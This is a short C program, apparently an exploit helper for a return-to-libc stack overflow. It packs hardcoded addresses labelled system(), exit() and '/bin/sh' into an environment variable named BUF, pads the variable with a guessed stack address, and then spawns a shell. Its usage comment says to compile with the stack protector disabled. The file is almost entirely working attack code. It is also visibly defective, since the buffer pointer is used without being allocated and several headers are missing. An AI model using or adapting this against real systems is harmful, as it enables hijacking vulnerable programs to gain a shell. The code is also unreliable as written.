#include <stdlib.h>


#define offset_size		 0
#define buffer_size		 600

/*
Useage:
	gcc -fno-stack-protector -o test test.c
	./test
*/



char sc[] =
			"\xe0\xa3\xe4\xb7" //system()	0xb7e4a3e0
			"\xb0\xd1\xe3\xb7" //exit()		0xb7e3d1b0
			"\x16\xf4\xff\xbf"; //binsh 	0xbffff416




unsigned long find_start(void) {
	__asm__("movl %esp,%eax");
}


int main(int argc, char *argv[])
{
	
	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset=offset_size, bsize=buffer_size;
	int i;
	char bash[] = "/bin/sh";
	int shPointer = &bash;
	printf("%x\n",shPointer);
	
	if (argc > 1) bsize = atoi(argv[1]);
	if (argc > 2) offset = atoi(argv[2]);

	addr = find_start() - offset;
	ptr = buff;
	addr_ptr = (long *) ptr;

	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;

	ptr += 4;
	for (i = 0; i < strlen(sc); i++)
		*(ptr++) = sc[i];

	buff[bsize - 1] = '\0';
	memcpy(buff,"BUF=",4);
	putenv(buff);
	system(bash);
}

